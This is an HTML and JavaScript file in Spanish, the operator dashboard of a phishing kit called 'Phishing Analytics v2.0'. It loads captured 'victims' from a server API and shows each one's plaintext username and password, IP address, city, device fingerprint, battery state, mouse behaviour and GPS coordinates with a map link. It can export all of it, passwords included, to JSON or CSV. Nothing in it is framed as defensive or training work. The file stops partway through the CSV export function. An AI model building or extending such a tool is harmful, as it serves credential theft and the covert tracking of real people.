<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard Avanzado - Phishing Analytics</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            padding: 20px;
            line-height: 1.6;
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
            padding: 30px;
            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
            border-radius: 15px;
            border: 2px solid #00ff88;
            box-shadow: 0 0 30px rgba(0,255,136,0.2);
        }
        
        .header h1 {
            font-size: 48px;
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .header p {
            color: #888;
            font-size: 16px;
        }
        
        .controls {
            margin-bottom: 25px;
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        button {
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            color: #0a0e27;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            font-size: 15px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(0,255,136,0.3);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0,255,136,0.5);
        }
        
        button.danger {
            background: linear-gradient(135deg, #ff3333, #ff6b6b);
        }
        
        button.secondary {
            background: linear-gradient(135deg, #667eea, #764ba2);
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #00ff8844;
            text-align: center;
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            border-color: #00ff88;
            box-shadow: 0 8px 25px rgba(0,255,136,0.3);
        }
        
        .stat-card h3 {
            font-size: 13px;
            color: #00ff88;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .stat-card .number {
            font-size: 42px;
            font-weight: bold;
            background: linear-gradient(135deg, #00ff88, #00d4ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .victims-section {
            background: linear-gradient(135deg, #1a1f3a 0%, #2d1b3d 100%);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid #00ff8844;
            margin-bottom: 20px;
        }
        
        .victims-section h2 {
            margin-bottom: 25px;
            font-size: 28px;
            color: #00ff88;
        }
        
        .filter-bar {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        .filter-bar input,
        .filter-bar select {
            background: #0a0e27;
            color: #e0e0e0;
            border: 1px solid #00ff8844;
            padding: 10px 15px;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .victim-card {
            background: #0a0e27;
            border: 1px solid #00ff8833;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 15px;
            transition: all 0.3s;
        }
        
        .victim-card:hover {
            border-color: #00ff88;
            box-shadow: 0 4px 15px rgba(0,255,136,0.2);
            transform: translateX(5px);
        }
        
        .victim-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 1px solid #00ff8822;
        }
        
        .victim-header h3 {
            color: #00ff88;
            font-size: 20px;
        }
        
        .victim-badge {
            display: inline-block;
            padding: 4px 12px;
            background: rgba(0,255,136,0.2);
            border-radius: 12px;
            font-size: 12px;
            color: #00ff88;
            margin-left: 8px;
        }
        
        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
        }
        
        .detail-section {
            background: #1a1f3a;
            padding: 15px;
            border-radius: 8px;
            border-left: 3px solid #00ff88;
        }
        
        .detail-section h4 {
            color: #00d4ff;
            margin-bottom: 10px;
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 13px;
        }
        
        .detail-label {
            color: #888;
        }
        
        .detail-value {
            color: #e0e0e0;
            font-weight: 500;
        }
        
        .password-value {
            color: #ffff00;
            font-weight: bold;
        }
        
        .loading {
            text-align: center;
            padding: 60px;
            font-size: 20px;
            color: #888;
        }
        
        .spinner {
            border: 4px solid rgba(0,255,136,0.1);
            border-top: 4px solid #00ff88;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .empty-state {
            text-align: center;
            padding: 60px;
            color: #666;
        }
        
        .fingerprint-hash {
            font-family: 'Courier New', monospace;
            color: #00d4ff;
            font-size: 11px;
            margin-top: 5px;
        }
        
        .expand-btn {
            background: #2d1b3d;
            color: #00ff88;
            border: 1px solid #00ff8844;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            margin-top: 10px;
            transition: all 0.3s;
        }
        
        .expand-btn:hover {
            background: #00ff8822;
            border-color: #00ff88;
        }
        
        .hidden-details {
            display: none;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid #00ff8822;
        }
        
        .hidden-details.show {
            display: block;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üéØ PHISHING ANALYTICS v2.0</h1>
        <p>Sistema Avanzado de Captura y An√°lisis de Datos</p>
    </div>
    
    <div class="controls">
        <button onclick="loadData()">üîÑ Actualizar</button>
        <button onclick="clearData()" class="danger">üóëÔ∏è Limpiar Datos</button>
        <button onclick="exportData()" class="secondary">üíæ Exportar JSON</button>
        <button onclick="exportCSV()" class="secondary">üìä Exportar CSV</button>
    </div>
    
    <div class="stats">
        <div class="stat-card">
            <h3>üë• V√≠ctimas Totales</h3>
            <div class="number" id="totalVictims">0</div>
        </div>
        <div class="stat-card">
            <h3>üåç Pa√≠ses</h3>
            <div class="number" id="uniqueCountries">0</div>
        </div>
        <div class="stat-card">
            <h3>üèôÔ∏è Ciudades</h3>
            <div class="number" id="uniqueCities">0</div>
        </div>
        <div class="stat-card">
            <h3>üì± M√≥viles</h3>
            <div class="number" id="mobileDevices">0</div>
        </div>
        <div class="stat-card">
            <h3>üíª Desktops</h3>
            <div class="number" id="desktopDevices">0</div>
        </div>
        <div class="stat-card">
            <h3>üïê √öltima Captura</h3>
            <div class="number" id="lastCapture" style="font-size: 16px;">-</div>
        </div>
    </div>
    
    <div class="victims-section">
        <h2>üìã Registro Detallado de V√≠ctimas</h2>
        
        <div class="filter-bar">
            <input type="text" id="searchInput" placeholder="üîç Buscar..." onkeyup="filterVictims()">
            <select id="deviceFilter" onchange="filterVictims()">
                <option value="">Todos los dispositivos</option>
                <option value="Mobile">üì± M√≥viles</option>
                <option value="Desktop">üíª Desktops</option>
                <option value="Tablet">üì± Tablets</option>
            </select>
            <select id="osFilter" onchange="filterVictims()">
                <option value="">Todos los SO</option>
            </select>
        </div>
        
        <div id="victimsContainer" class="loading">
            <div class="spinner"></div>
            <p>Cargando datos...</p>
        </div>
    </div>

    <script>
        let victimsData = [];
        let lastDataHash = '';

        async function loadData() {
            try {
                const response = await fetch('/api/victims');
                const newData = await response.json();

                // Crear hash simple de los datos para detectar cambios
                const newHash = JSON.stringify(newData);

                // Solo actualizar si los datos cambiaron
                if (newHash !== lastDataHash) {
                    victimsData = newData;
                    lastDataHash = newHash;

                    updateStats();
                    renderVictims(victimsData);
                    updateFilters();
                } else {
                    // Solo actualizar estad√≠sticas (tiempo relativo)
                    updateStats();
                }

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('victimsContainer').innerHTML =
                    '<div class="empty-state"><h3>‚ùå Error al cargar datos</h3><p>Verifica que el servidor est√© activo</p></div>';
            }
        }
        
        function updateStats() {
            document.getElementById('totalVictims').textContent = victimsData.length;
            
            const uniqueCountries = [...new Set(victimsData.map(v => v.network?.country || 'Unknown'))];
            document.getElementById('uniqueCountries').textContent = uniqueCountries.length;
            
            const uniqueCities = [...new Set(victimsData.map(v => v.network?.city || 'Unknown'))];
            document.getElementById('uniqueCities').textContent = uniqueCities.length;
            
            const mobileCount = victimsData.filter(v => v.device?.type === 'Mobile').length;
            document.getElementById('mobileDevices').textContent = mobileCount;
            
            const desktopCount = victimsData.filter(v => v.device?.type === 'Desktop').length;
            document.getElementById('desktopDevices').textContent = desktopCount;
            
            if (victimsData.length > 0) {
                const lastVictim = victimsData[victimsData.length - 1];
                const timeAgo = getTimeAgo(new Date(lastVictim.timestamp));
                document.getElementById('lastCapture').textContent = timeAgo;
            }
        }
        
        function updateFilters() {
            const osSet = [...new Set(victimsData.map(v => v.os?.name || 'Unknown'))];
            const osFilter = document.getElementById('osFilter');
            osFilter.innerHTML = '<option value="">Todos los SO</option>';
            osSet.forEach(os => {
                const option = document.createElement('option');
                option.value = os;
                option.textContent = getOSIcon(os) + ' ' + os;
                osFilter.appendChild(option);
            });
        }
        
        function renderVictims(victims) {
            const container = document.getElementById('victimsContainer');
            
            if (victims.length === 0) {
                container.innerHTML = '<div class="empty-state"><h3>üì≠ Sin v√≠ctimas capturadas</h3><p>Esperando conexiones...</p></div>';
                return;
            }
            
            container.innerHTML = '';
            const reversedVictims = [...victims].reverse();
            reversedVictims.forEach((victim, index) => {
                const card = createVictimCard(victim, victims.length - index);
                container.appendChild(card);
            });
        }
        
        function createVictimCard(victim, number) {
            const card = document.createElement('div');
            card.className = 'victim-card';
            
            const date = new Date(victim.timestamp).toLocaleString('es-MX');
            
            card.innerHTML = `
                <div class="victim-header">
                    <div>
                        <h3>${getDeviceIcon(victim.device?.type)} ${victim.username || 'Visitor'}</h3>
                        <span class="victim-badge">#${number}</span>
                        <span class="victim-badge">${victim.device?.type || 'Unknown'}</span>
                        <div class="fingerprint-hash">üîê ${victim.fingerprint}</div>
                    </div>
                    <div style="text-align: right; color: #888; font-size: 13px;">
                        <div>üïê ${date}</div>
                        <div style="margin-top: 5px;">${getTimeAgo(new Date(victim.timestamp))}</div>
                    </div>
                </div>
                
                <div class="victim-details">
                    <div class="detail-section">
                        <h4>üîê Credenciales</h4>
                        <div class="detail-item">
                            <span class="detail-label">Usuario:</span>
                            <span class="detail-value">${victim.username || 'N/A'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Contrase√±a:</span>
                            <span class="password-value">${victim.password || 'N/A'}</span>
                        </div>
                    </div>
                    
                    <div class="detail-section">
                        <h4>üåê Red</h4>
                        <div class="detail-item">
                            <span class="detail-label">IP:</span>
                            <span class="detail-value">${victim.network?.ip || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Pa√≠s:</span>
                            <span class="detail-value">${victim.network?.country || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Ciudad:</span>
                            <span class="detail-value">${victim.network?.city || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Conexi√≥n:</span>
                            <span class="detail-value">${victim.network?.connectionType || 'Unknown'}</span>
                        </div>
                    </div>
                    
                    <div class="detail-section">
                        <h4>${getDeviceIcon(victim.device?.type)} Dispositivo</h4>
                        <div class="detail-item">
                            <span class="detail-label">Tipo:</span>
                            <span class="detail-value">${victim.device?.type || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Modelo:</span>
                            <span class="detail-value">${victim.device?.model || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">CPU:</span>
                            <span class="detail-value">${victim.device?.cpuCores || 'Unknown'} cores</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">RAM:</span>
                            <span class="detail-value">${victim.device?.memory || 'Unknown'}</span>
                        </div>
                    </div>
                    
                    <div class="detail-section">
                        <h4>${getOSIcon(victim.os?.name)} Sistema</h4>
                        <div class="detail-item">
                            <span class="detail-label">SO:</span>
                            <span class="detail-value">${victim.os?.name || 'Unknown'} ${victim.os?.version || ''}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Navegador:</span>
                            <span class="detail-value">${victim.browser?.name || 'Unknown'} ${victim.browser?.version || ''}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Pantalla:</span>
                            <span class="detail-value">${victim.screen?.resolution || 'Unknown'}</span>
                        </div>
                    </div>
                    
                    <div class="detail-section">
                        <h4>üîã Bater√≠a</h4>
                        <div class="detail-item">
                            <span class="detail-label">Nivel:</span>
                            <span class="detail-value">${victim.battery?.level || 'Unknown'}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Cargando:</span>
                            <span class="detail-value">${victim.battery?.charging ? '‚ö° S√≠' : 'üîå No'}</span>
                        </div>
                    </div>
                    
                    <div class="detail-section">
                        <h4>üñ±Ô∏è Comportamiento</h4>
                        <div class="detail-item">
                            <span class="detail-label">Mouse:</span>
                            <span class="detail-value">${victim.behavior?.mouseMovements || 0} mov</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Clicks:</span>
                            <span class="detail-value">${victim.behavior?.clicks || 0}</span>
                        </div>
                        <div class="detail-item">
                            <span class="detail-label">Tiempo:</span>
                            <span class="detail-value">${victim.behavior?.timeOnPage || 0}s</span>
                        </div>
                    </div>
                </div>
                
                <button class="expand-btn" onclick="toggleDetails(this)">üîç Ver M√°s Detalles</button>
                
                <div class="hidden-details">
                    <div class="victim-details">
                        <div class="detail-section">
                            <h4>üé® GPU</h4>
                            <div class="detail-item">
                                <span class="detail-label">Vendor:</span>
                                <span class="detail-value">${victim.fingerprints?.webglVendor || 'N/A'}</span>
                            </div>
                            <div class="detail-item" style="flex-direction: column; align-items: flex-start;">
                                <span class="detail-label">Renderer:</span>
                                <span class="detail-value" style="font-size: 11px;">${victim.fingerprints?.webglRenderer || 'N/A'}</span>
                            </div>
                        </div>
                        
                        <div class="detail-section">
                            <h4>üì∏ Hardware</h4>
                            <div class="detail-item">
                                <span class="detail-label">C√°maras:</span>
                                <span class="detail-value">${victim.hardware?.videoInputs || 'Unknown'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Micr√≥fonos:</span>
                                <span class="detail-value">${victim.hardware?.audioInputs || 'Unknown'}</span>
                            </div>
                        </div>
                        
                        <div class="detail-section">
                            <h4>üîê Privacidad</h4>
                            <div class="detail-item">
                                <span class="detail-label">Cookies:</span>
                                <span class="detail-value">${victim.browser?.cookiesEnabled ? '‚úÖ' : '‚ùå'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">DNT:</span>
                                <span class="detail-value">${victim.browser?.doNotTrack || 'Unknown'}</span>
                            </div>
                        </div>
                        
                        ${victim.geolocation?.latitude ? `
                        <div class="detail-section">
                            <h4>üåç GPS</h4>
                            <div class="detail-item">
                                <span class="detail-label">Coords:</span>
                                <span class="detail-value">${victim.geolocation?.latitude?.toFixed(6)}, ${victim.geolocation?.longitude?.toFixed(6)}</span>
                            </div>
                            <div style="margin-top: 10px;">
                                <a href="https://www.google.com/maps?q=${victim.geolocation?.latitude},${victim.geolocation?.longitude}" 
                                   target="_blank" 
                                   style="color: #00ff88;">
                                   üìç Ver en Mapa
                                </a>
                            </div>
                        </div>
                        ` : ''}
                    </div>
                </div>
            `;
            
            return card;
        }
        
        function toggleDetails(button) {
            const details = button.nextElementSibling;
            details.classList.toggle('show');
            button.textContent = details.classList.contains('show') ? 
                'üîº Ocultar Detalles' : 'üîç Ver M√°s Detalles';
        }
        
        function filterVictims() {
            const searchTerm = document.getElementById('searchInput').value.toLowerCase();
            const deviceFilter = document.getElementById('deviceFilter').value;
            const osFilter = document.getElementById('osFilter').value;
            
            const filtered = victimsData.filter(victim => {
                const matchesSearch = !searchTerm || 
                    (victim.network?.ip || '').toLowerCase().includes(searchTerm) ||
                    (victim.username || '').toLowerCase().includes(searchTerm) ||
                    (victim.network?.city || '').toLowerCase().includes(searchTerm);
                
                const matchesDevice = !deviceFilter || victim.device?.type === deviceFilter;
                const matchesOS = !osFilter || victim.os?.name === osFilter;
                
                return matchesSearch && matchesDevice && matchesOS;
            });
            
            renderVictims(filtered);
        }
        
        function getTimeAgo(date) {
            const seconds = Math.floor((new Date() - date) / 1000);
            if (seconds < 60) return 'Hace ' + seconds + ' seg';
            if (seconds < 3600) return 'Hace ' + Math.floor(seconds / 60) + ' min';
            if (seconds < 86400) return 'Hace ' + Math.floor(seconds / 3600) + ' hrs';
            return 'Hace ' + Math.floor(seconds / 86400) + ' d√≠as';
        }
        
        function getDeviceIcon(type) {
            const icons = {'Mobile': 'üì±', 'Desktop': 'üíª', 'Tablet': 'üì±', 'Unknown': '‚ùì'};
            return icons[type] || '‚ùì';
        }
        
        function getOSIcon(os) {
            const icons = {'Windows': 'ü™ü', 'macOS': 'üçé', 'iOS': 'üì±', 'iPadOS': 'üì±', 'Android': 'ü§ñ', 'Linux': 'üêß'};
            return icons[os] || '‚ùì';
        }
        
        async function clearData() {
            if (confirm('‚ö†Ô∏è ¬øEliminar TODOS los datos?')) {
                try {
                    await fetch('/api/clear', { method: 'DELETE' });
                    alert('‚úÖ Datos eliminados');
                    loadData();
                } catch (error) {
                    alert('‚ùå Error');
                }
            }
        }
        
        async function exportData() {
            try {
                const blob = new Blob([JSON.stringify(victimsData, null, 2)], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `victims_${Date.now()}.json`;
                link.click();
                URL.revokeObjectURL(url);
            } catch (error) {
                alert('‚ùå Error al exportar');
            }
        }
        
        async function exportCSV() {
            try {
                let csv = 'Timestamp,Username,Password,IP,Country,City,Device,OS,Browser,Battery\n';
                victimsData.forEach(v => {
                    csv += `"${v.timestamp}","${v.username}","${v.password}","${v.network?.ip}","${v.network?.country}","${v.network?.city}","${v.device?.type}","${v.os?.name}","${v.browser?.name}","${v.battery?.level}"\n`;
                });
                const blob = new Blob([csv], { type: 'text/csv' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = `victims_${Date.now()}.csv`;
                link.click();
                URL.revokeObjectURL(url);
            } catch (error) {
                alert('‚ùå Error al exportar CSV');
